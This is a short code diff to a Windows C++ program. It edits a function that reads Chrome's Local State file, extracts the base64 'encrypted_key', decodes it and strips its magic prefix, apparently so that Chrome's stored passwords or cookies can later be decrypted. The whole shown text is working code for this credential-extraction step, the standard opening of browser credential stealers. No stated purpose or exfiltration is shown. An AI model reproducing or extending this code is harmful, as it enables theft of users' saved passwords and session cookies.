@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <wincrypt.h>
 #include <iostream>
 #include <stdio.h>
 #include <string.h>
@@ -132,9 +133,7 @@ void getAESKEy(std::string chromePath) {
 	std::string b64Key = localStateJSON["os_crypt"]["encrypted_key"];
 
 	// Decode using base64
-	std::vector<BYTE> decodedKey = b64Decode(b64Key);
-
-	printf("Decoded key: %s\n", decodedKey);
+	auto decodedKey = b64Decode(b64Key.c_str());
 
 	// Ignore magic bytes and return
 	std::string keyOut(decodedKey.begin() + 5, decodedKey.end());
